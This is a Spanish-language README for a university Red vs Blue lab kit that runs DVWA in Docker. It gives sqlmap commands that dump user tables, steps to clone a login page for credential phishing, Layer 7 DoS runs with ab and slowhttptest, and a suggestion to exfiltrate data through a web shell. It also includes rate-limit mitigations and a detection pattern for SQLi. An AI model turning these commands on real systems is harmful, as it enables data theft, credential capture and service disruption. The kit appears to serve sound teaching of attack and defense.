# Kit de laboratorio — Proyecto Final Red vs Blue

**Ciberseguridad y Ciberataques · Universidad Innova**

Este kit contiene el laboratorio base para el proyecto. Úsenlo únicamente en un entorno académico aislado, con datos sintéticos y dentro del alcance autorizado. No ataquen sistemas reales.

## 1. Requisitos

- Docker Engine 24+ con Compose v2 (Docker Desktop con WSL2 en Windows).
- 8 GB de RAM y 4 vCPU recomendados; 4 GB y 2 vCPU como mínimo con ajustes.
- 6 GB de disco libre.
- Git, un editor de texto y un navegador.
- Tailscale o ZeroTier para el trabajo remoto.

No trabajen dentro de OneDrive ni de una carpeta sincronizada. Copien el kit a `C:\lab` o al home de WSL2.

## 2. Puesta en marcha

```bash
# 1) Variables de entorno
cp .env.example .env
# Genere contraseñas y edite .env
openssl rand -base64 24

# 2) Construir el atacante y levantar el laboratorio
docker compose build attacker
docker compose up -d

# 3) Verificar
docker compose ps
docker stats --no-stream

# 4) Inicializar DVWA
# Abra http://127.0.0.1:8080/setup.php
# Pulse "Create / Reset Database"
# Entre con admin / password, cambie la contraseña y fije security=low
```

En Linux, prepare los permisos de logs:

```bash
mkdir -p logs/{nginx,apache,mysql,phish,consolidated}
chmod -R 777 logs
```

## 3. Servicios

| Servicio | Función | Puerto |
|---|---|---|
| `edge` | Nginx: reverse proxy y límites de tasa | `127.0.0.1:8080` |
| `web` | DVWA: SQLi, login, upload y RCE | interno |
| `db` | MariaDB con datos sintéticos | interno |
| `logs` | Vector: consolida logs en JSON Lines | interno |
| `attacker` | nmap, sqlmap, hydra, gobuster, ab, slowhttptest | interno |
| `phish` | PHP/Apache para el clon de login | `127.0.0.1:8081` |
| `wazuh-agent` | Opcional, perfil `wazuh` | interno |
| `mailpit` | Opcional, perfil `mail` | `127.0.0.1:8025` |

## 4. Logs y evidencia

```bash
ls -l logs/nginx logs/apache logs/mysql logs/phish
tail -n 20 logs/consolidated/$(date +%F).jsonl

# Intentos de SQLi
jq -r 'select(.message | test("union[[:space:]]+select|information_schema|sleep\\(|benchmark\\("; "i")) | [.timestamp, .file, .message] | @tsv' logs/consolidated/*.jsonl
```

La evidencia se copia a `evidence/`, se hashea con SHA-256 y se documenta en `docs/03_cadena_custodia.md`. No editen los archivos originales.

## 5. Escenario A — SQLi y exfiltración

```bash
# Reconocimiento
docker compose exec attacker nmap -sV -p 80 edge
docker compose exec attacker gobuster dir -u http://edge -w /usr/share/wordlists/dirb/common.txt

# SQLi con sqlmap (reemplace la cookie de su sesión)
docker compose exec attacker sqlmap \
  -u "http://edge/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=<SESSION_ID>; security=low" \
  --batch --dbs --output-dir=/loot/sqlmap

docker compose exec attacker sqlmap \
  -u "http://edge/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=<SESSION_ID>; security=low" \
  --batch -D dvwa -T users --dump --output-dir=/loot/sqlmap

# Hash del dump
docker compose exec attacker sh -c 'sha256sum /loot/sqlmap/*/dump/dvwa/users.csv'
```

Para la salida, usen un listener HTTP en `phish` o una web shell en `web`. Documenten qué tramo es real y qué tramo es simulado.

## 6. Escenario B — Phishing de credenciales

1. Copien el HTML del login de DVWA en `phish/index.php`.
2. Cambien el `action` del formulario a `/capture.php`.
3. Publiquen el enlace con la URL del host (`http://<host>:8081/`), nunca un dominio real.
4. Redacten dos `.eml` en `phish/outbox/` y entréguenlos por el canal del equipo.
5. La víctima simulada introduce credenciales señuelo.
6. Revisen `loot/phish/creds.log`, hasheénlo y documenten la respuesta.

Mailpit opcional:

```bash
docker compose --profile mail up -d
# Visor: http://127.0.0.1:8025
```

## 7. Escenario C — DoS de Capa 7

```bash
# Línea base
docker compose exec attacker ab -n 200 -c 10 http://edge/login.php

# Inundación HTTP controlada
docker compose exec attacker ab -n 2000 -c 50 http://edge/login.php

# Slowloris controlado
docker compose exec attacker slowhttptest -c 50 -H -g -o /loot/slow.html \
  -i 10 -r 20 -t 60 -u http://edge/

# Disponibilidad durante la prueba
for i in $(seq 1 30); do
  curl -s -o /dev/null -w "%{http_code} %{time_total}\n" http://edge/login.php
  sleep 1
done
```

Límites: 60 s por prueba, 50 conexiones y 2 000 solicitudes. No usen SYN flood, UDP flood ni amplificación.

Mitigación en `config/nginx/default.conf`:

```nginx
limit_req_zone  $binary_remote_addr zone=perip:10m rate=10r/s;
limit_conn_zone $binary_remote_addr zone=connperip:10m;

# Dentro de location /
limit_req zone=perip burst=20 nodelay;
limit_conn connperip 20;
```

Recarguen con:

```bash
docker compose exec edge nginx -t
docker compose exec edge nginx -s reload
```

## 8. Tailscale o ZeroTier

Tailscale:

```bash
tailscale up --ssh --hostname rb-lab-01
tailscale status
tailscale serve --bg 8080
tailscale serve --bg 8081
```

ACL mínima:

```json
{
  "tagOwners": { "tag:redblue": ["autogroup:admin"] },
  "acls": [
    { "action": "accept", "src": ["tag:redblue"],
      "dst": ["tag:redblue:8080", "tag:redblue:8081", "tag:redblue:443"] }
  ]
}
```

ZeroTier: creen una red privada, autoricen solo los nodos del equipo y limiten el acceso a 8080/8081. No expongan puertos a Internet ni usen Tailscale Funnel.

## 9. Solución de problemas

| Síntoma | Acción |
|---|---|
| Puerto 8080 u 8081 ocupado | Cambien `BIND_ADDR` o el puerto publicado. |
| `db` no llega a `healthy` | Revisen `DB_PASSWORD` y `DB_ROOT_PASSWORD`; esperen 30 s. |
| DVWA muestra error de base | Confirmen `DB_SERVER=db`; abran `/setup.php` cuando `db` esté healthy. |
| Permiso denegado en logs | En Linux: `chmod -R 777 logs`; eviten OneDrive. |
| Vector no consolida | Revisen `docker compose logs logs` y las rutas montadas. |
| Tailscale no resuelve | Usen MagicDNS, `tailscale status` y `tailscale serve`. |
| Host con poca RAM | Detengan `phish` y `wazuh-agent`; bajen `attacker` a 512 MB. |

## 10. Limpieza

```bash
docker compose stop
# Solo cuando la evidencia esté copiada, hasheada y verificada:
# docker compose down
```

No ejecuten `docker compose down -v` durante un incidente: elimina volúmenes y evidencia.

## 11. Estructura del kit

```
Kit_Estudiante_Red_vs_Blue/
├── README.md
├── docker-compose.yml
├── .env.example
├── .gitignore
├── attacker/Dockerfile
├── config/
│   ├── apache/lab-logging.conf
│   ├── nginx/default.conf
│   └── vector/vector.toml
├── phish/
│   ├── README.md
│   └── capture.php
├── scripts/
│   ├── baseline.sh
│   └── verify_hashes.sh
└── docs/
    ├── 01_charter.md
    ├── 02_playbook.md
    ├── 03_cadena_custodia.md
    ├── 04_matriz_attack.csv
    ├── 05_catalogo_detecciones.csv
    ├── 06_checklist_entrega.md
    ├── 07_plantilla_informe.md
    ├── 08_recursos.md
    └── 09_preguntas_defensa.md
```

## 12. Referencias

- MITRE ATT&CK: https://attack.mitre.org/
- NIST SP 800-61r3: https://doi.org/10.6028/NIST.SP.800-61r3
- OWASP Top 10: https://owasp.org/Top10/
- RFC 3227: https://www.rfc-editor.org/rfc/rfc3227
- ISO/IEC 27037:2012
- DVWA: https://github.com/digininja/DVWA
